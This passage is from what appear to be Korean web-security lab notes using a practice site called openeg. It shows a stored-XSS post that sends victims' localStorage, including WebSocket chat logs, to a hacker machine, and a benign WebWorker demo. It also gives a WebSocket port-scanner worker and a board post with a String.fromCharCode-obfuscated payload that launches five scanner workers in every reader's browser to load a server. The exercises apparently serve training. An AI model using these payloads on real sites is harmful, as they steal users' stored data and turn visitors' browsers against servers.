15,99,114,105,112,116,62))</script>

~~~



5. 2번에서 사용하던 크롬에서 http://openeg.com:8181/openeg/login.do로 접속하여 관리자 계정으로 로그인한 뒤 게시판에 있는 해커가 등록한 글을 읽으면 자신의 로컬 스토리지에 있는 정보를 해커에게로 전송하게 된다.
6. 해커머신의 콘솔에 희생자의 로컬 스토리지 정보가 출력된다.



#### 웹소켓으로 채팅하고 있는 사용자의 정보를 빼내가는 웹스토리지 공격

1. tomcat7를 stop한다
2. 8080포트를 사용하고 있는 WebSocket 프로젝트의 server.xml에서 포트를 8181로 바꾸고 index.html의 18행의 localhost:8080을 openeg.com:8181로 바꾸고 41행에 다음을 추가한다.
   	localStorage.content =textarea.value;
3. tomcat8을 가동하여 WebSocket 프로젝트가 가동되도록 한다.
4. 크롬 사용자가 채팅을 시작한다.(채팅 내용이 로컬스토리지에 저장된다)
5. tomcat8을 stop하고 tomcat7를 다시 가동한다.
6. 크롬 사용자가 openeg 게시판에 해커가 등록해 놓은 글을 읽는다.(로컬스토리지 내용이 해커 머쉰으로 전송된다)
7. 해커 머쉰의 콘솔에 크롬 사용자의 채팅 내용이 다 보인다

(* 한글로 채팅한 내용이 안깨지기 위해서는 tomcat7과 tomcat8의 server.xml에서 URIEncoding=”T\UTF-8”을 설정해야 한다)



### WebWorker

1. 이클립스>openeg>WebContent>webworker>sample>webworker_simple.html을 다음과 같이 작성한다

~~~html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
<script type="text/javascript">

var output;  // 받은 메시지 출력
var worker;  // worker



// worker 실행
function startWorker() {

	output = document.getElementById( 'output' );        

  // Worker 지원 유무 확인
  if ( !!window.Worker ) {

    // 실행하고 있는 워커 있으면 중지시키기
    if ( worker ) {
      stopWorker();
    }

    worker = new Worker( 'worker.js' );
    worker.postMessage( '워커 실행' );    // 워커에 메시지를 보낸다.

    // 메시지는 JSON구조로 직렬화 할 수 있는 값이면 사용할 수 있다. Object등
    // worker.postMessage( { name : 'jes' } );

    // 워커로 부터 메시지를 수신한다.
    worker.onmessage = function( e ) {
      console.log('호출 페이지 - ', e.data );
      output.innerHTML += e.data;
    };
  }

}

// worker 중지
function stopWorker() {

  if ( worker ) {
    worker.terminate();
    worker = null;
  }

}

</script>
</head>
<body>
 <button id="btnStartWorker" class="btn" onclick="startWorker()" >워커 시작</button>
<button id="btnStopWorker" class="btn" onclick="stopWorker()" >워커 중지</button>
<div id="output"></div> 
</body>
</html>

~~~



2. 같은 위치에 worker.js를 작성한다.

~~~js
var i = 0; // 1씩 증가시켜서 전달할 변수

// 메시지 수신
self.onmessage = function( e ) {
    loop();
};

// 호출한 페이지에 1씩 증가시킨 i를 1초마다 전달한다.
function loop() {

    // 1씩 증가시켜서 전달
    postMessage( ++i ); 

    // 1초뒤에 다시 실행
    setTimeout( function() {
        loop();
    }, 1000 );

}

~~~

3. 1번의 html을 Run As> Run on Server> 띄워진 내장 브라우저에서 본다

~~~
http://localhost:8181/openeg/webworker/sample/webworker_simple.html
~~~

4. 워커 시작 버튼을 누르면 1부터 증가한 숫자가 출력되고 워커 중지 버튼을 누르면 중지된다.



#### 워커를 이용한 ddos 공격

~~~js
var active_tab = 1;
var ip = "127.0.0.1";
var start_port = "8070";
var end_port = "8090";
var blocked_ports = [0,1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,4045,6000];
var ws;
var start_time;
var current_port = 0;
var open_port_max = 300;
var closed_port_max = 2000;
var ps_open_ports = [];
var ps_closed_ports = [];
var ps_timeout_ports = [];

function scan_ports()
{
	current_port = 0;
	ps_open_ports = [];
	ps_closed_ports = [];
	ps_timeout_ports = [];

	reset();
	setTimeout("scan_ports_ws()", 1);
}

function scan_ports_ws()
{
	if (init_port_ps()) {
		return;
	}

	if (is_blocked(current_port)) {
	   log(current_port + " is blocked");
	   setTimeout("scan_ports_ws()", 1);
	   return;
	}

	start_time = (new Date).getTime();
	try {
		ws = new WebSocket("ws://" + ip + ":" + current_port);
		setTimeout("check_ps_ws()", 5);
	} catch(err) {
		postMessage("<b>Scan stopped. Exception: " + err + "</b>");
		return;
	}
}

function check_ps_ws()
{
	var interval = (new Date).getTime() - start_time;
	if (ws.readyState == 0) {
		if (interval > closed_port_max) {
			log("<font color='red'>" + current_port + " is time exceeded</font>");
			ps_timeout_ports.push(current_port);
			setTimeout("scan_ports_ws()", 1);
		} else {
			setTimeout("check_ps_ws()", 5);
		}
	}
	else {
		if (interval < open_port_max) {
			log("<font color='blue'>" + current_port + " is open</font>");
			ps_open_ports.push(current_port);
		} else {
			log(current_port + " is closed");
			ps_closed_ports.push(current_port);
		}
		setTimeout("scan_ports_ws()", 1);
	}
}

function init_port_ps()
{
	if (current_port == 0) {
		current_port = start_port;
	} 
	else if (current_port == end_port) {
		/*
		document.getElementById('resultOpen').innerHTML = ps_open_ports + "&nbsp;";
		document.getElementById('resultClosed').innerHTML = ps_closed_ports + "&nbsp;";
		document.getElementById('resultFiltered').innerHTML = ps_timeout_ports + "&nbsp;";
		*/
		return true;
	}
	else {
		current_port++;
	}
	return false;
}

function is_blocked(port_no)
{
	for (var i = 0; i < blocked_ports.length; i++) {
		if (blocked_ports[i] == port_no) {
			return true;
		}
	}
	return false;
}

function log(s)
{
	postMessage(s);
}

function reset()
{
	/*
	document.getElementById('resultOpen').innerHTML = " ";
	document.getElementById('resultClosed').innerHTML = " ";
	document.getElementById('resultFiltered').innerHTML = " ";
	document.getElementById('log').innerHTML = " ";
	*/
}

scan_ports();

~~~



2. 해커가 게시판에 글을 등록한다 (글 내용이 길어서 반드시 사이즈를 확인해야 한다 alter table board modify content VARCHAR(6000) ; )

~~~
글제목: 절대 DDOS 공격 아닙니다
글내용: 

<script> document.write(String.fromCharCode(60,100,105,118,32,105,100,61,34,119,111,114,107,101,114,49,34,32,115,116,121,108,101,61,34,104,101,105,103,104,116,58,49,48,48,112,120,59,109,97,120,45,104,101,105,103,104,116,58,49,48,48,112,120,59,98,111,114,100,101,114,58,49,112,120,32,115,111,108,105,100,32,103,114,97,121,59,111,118,101,114,102,108,111,119,45,121,58,115,99,114,111,108,108,59,34,62,60,47,100,105,118,62,10,60,100,105,118,32,105,100,61,34,119,111,114,107,101,114,50,34,32,115,116,121,108,101,61,34,104,101,105,103,104,116,58,49,48,48,112,120,59,109,97,120,45,104,101,105,103,104,116,58,49,48,48,112,120,59,98,111,114,100,101,114,58,49,112,120,32,115,111,108,105,100,32,103,114,97,121,59,111,118,101,114,102,108,111,119,45,121,58,115,99,114,111,108,108,59,34,62,60,47,100,105,118,62,10,60,100,105,118,32,105,100,61,34,119,111,114,107,101,114,51,34,32,115,116,121,108,101,61,34,104,101,105,103,104,116,58,49,48,48,112,120,59,109,97,120,45,104,101,105,103,104,116,58,49,48,48,112,120,59,98,111,114,100,101,114,58,49,112,120,32,115,111,108,105,100,32,103,114,97,121,59,111,118,101,114,102,108,111,119,45,121,58,115,99,114,111,108,108,59,34,62,60,47,100,105,118,62,10,60,100,105,118,32,105,100,61,34,119,111,114,107,101,114,52,34,32,115,116,121,108,101,61,34,104,101,105,103,104,116,58,49,48,48,112,120,59,109,97,120,45,104,101,105,103,104,116,58,49,48,48,112,120,59,98,111,114,100,101,114,58,49,112,120,32,115,111,108,105,100,32,103,114,97,121,59,111,118,101,114,102,108,111,119,45,121,58,115,99,114,111,108,108,59,34,62,60,47,100,105,118,62,10,60,100,105,118,32,105,100,61,34,119,111,114,107,101,114,53,34,32,115,116,121,108,101,61,34,104,101,105,103,104,116,58,49,48,48,112,120,59,109,97,120,45,104,101,105,103,104,116,58,49,48,48,112,120,59,98,111,114,100,101,114,58,49,112,120,32,115,111,108,105,100,32,103,114,97,121,59,111,118,101,114,102,108,111,119,45,121,58,115,99,114,111,108,108,59,34,62,60,47,100,105,118,62,10,10,60,115,99,114,105,112,116,62,10,9,118,97,114,32,119,111,114,107,101,114,49,32,61,32,110,101,119,32,87,111,114,107,101,114,40,34,46,46,47,102,105,108,101,115,47,119,115,80,111,114,116,83,99,97,110,110,101,114,46,106,115,34,41,59,10,9,119,111,114,107,101,114,49,46,97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114,40,39,109,101,115,115,97,103,101,39,44,32,102,117,110,99,116,105,111,110,40,101,118,101,110,116,41,32,123,10,9,9,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,119,111,114,107,101,114,49,34,41,46,105,110,110,101,114,72,84,77,76,32,43,61,32,101,118,101,110,116,46,100,97,116,97,32,43,32,34,60,98,114,47,62,34,59,10,9,125,41,59,10,10,9,118,97,114,32,119,111,114,107,101,114,50,32,61,32,110,101,119,32,87,111,114,107,101,114,40,34,46,46,47,102,105,108,101,115,47,119,115,80,111,114,116,83,99,97,110,110,101,114,46,106,115,34,41,59,10,9,119,111,114,107,101,114,50,46,97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114,40,39,109,101,115,115,97,103,101,39,44,32,102,117,110,99,116,105,111,110,40,101,118,101,110,116,41,32,123,10,9,9,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,119,111,114,107,101,114,50,34,41,46,105,110,110,101,114,72,84,77,76,32,43,61,32,101,118,101,110,116,46,100,97,116,97,32,43,32,34,60,98,114,47,62,34,59,10,9,125,41,59,10,10,9,118,97,114,32,119,111,114,107,101,114,51,32,61,32,110,101,119,32,87,111,114,107,101,114,40,34,46,46,47,102,105,108,101,115,47,119,115,80,111,114,116,83,99,97,110,110,101,114,46,106,115,34,41,59,10,9,119,111,114,107,101,114,51,46,97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114,40,39,109,101,115,115,97,103,101,39,44,32,102,117,110,99,116,105,111,110,40,101,118,101,110,116,41,32,123,10,9,9,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,119,111,114,107,101,114,51,34,41,46,105,110,110,101,114,72,84,77,76,32,43,61,32,101,118,101,110,116,46,100,97,116,97,32,43,32,34,60,98,114,47,62,34,59,10,9,125,41,59,10,10,9,118,97,114,32,119,111,114,107,101,114,52,32,61,32,110,101,119,32,87,111,114,107,101,114,40,34,46,46,47,102,105,108,101,115,47,119,115,80,111,114,116,83,99,97,110,110,101,114,46,106,115,34,41,59,10,9,119,111,114,107,101,114,52,46,97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114,40,39,109,101,115,115,97,103,101,39,44,32,102,117,110,99,116,105,111,110,40,101,118,101,110,116,41,32,123,10,9,9,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,119,111,114,107,101,114,52,34,41,46,105,110,110,101,114,72,84,77,76,32,43,61,32,101,118,101,110,116,46,100,97,116,97,32,43,32,34,60,98,114,47,62,34,59,10,9,125,41,59,10,10,9,118,97,114,32,119,111,114,107,101,114,53,32,61,32,110,101,119,32,87,111,114,107,101,114,40,34,46,46,47,102,105,108,101,115,47,119,115,80,111,114,116,83,99,97,110,110,101,114,46,106,115,34,41,59,10,9,119,111,114,107,101,114,53,46,97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114,40,39,109,101,115,115,97,103,101,39,44,32,102,117,110,99,116,105,111,110,40,101,118,101,110,116,41,32,123,10,9,9,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,119,111,114,107,101,114,53,34,41,46,105,110,110,101,114,72,84,77,76,32,43,61,32,101,118,101,110,116,46,100,97,116,97,32,43,32,34,60,98,114,47,62,34,59,10,9,125,41,59,10,60,47,115,99,114,105,112,116,62)); </script>

~~~

~~~html
<div id="worker1" style="height:100px;max-height:100px;border:1px solid gray;overflow-y:scroll;"></div>
<div id="worker2" style="height:100px;max-height:100px;border:1px solid gray;overflow-y:scroll;"></div>
<div id="worker3" style="height:100px;max-height:100px;border:1px solid gray;overflow-y:scroll;"></div>
<div id="worker4" style="height:100px;max-height:100px;border:1px solid gray;overflow-y:scroll;"></div>
<div id="worker5" style="height:100px;max-height:100px;border:1px solid gray;overflow-y:scroll;"></div>

<script>
	var worker1 = new Worker("../files/wsPortScanner.js");
	worker1.addEventListener('message', function(event) {
		document.getElementById("worker1").innerHTML += event.data + "<br/>";
	});

	var worker2 = new Worker("../files/wsPortScanner.js");
	worker2.addEventListener('message', function(event) {
		document.getElementById("worker2").innerHTML += event.data + "<br/>";
	});

	var worker3 = new Worker("../files/wsPortScanner.js");
	worker3.addEventListener('message', function(event) {
		document.getElementById("worker3").innerHTML += event.data + "<br/>";
	});

	var worker4 = new Worker("../files/wsPortScanner.js");
	worker4.addEventListener('message', function(event) {
		document.getElementById("worker4").innerHTML += event.data + "<br/>";
	});

	var worker5 = new Worker("../files/wsPortScanner.js");
	worker5.addEventListener('message', function(event) {
		document.getElementById("worker5").innerHTML += event.data + "<br/>";
	});
</script>

~~~



3. 이 글을 클릭하는 모든 브라우저에서 웹워커가 실행되면서 서버에 부하를 주게된다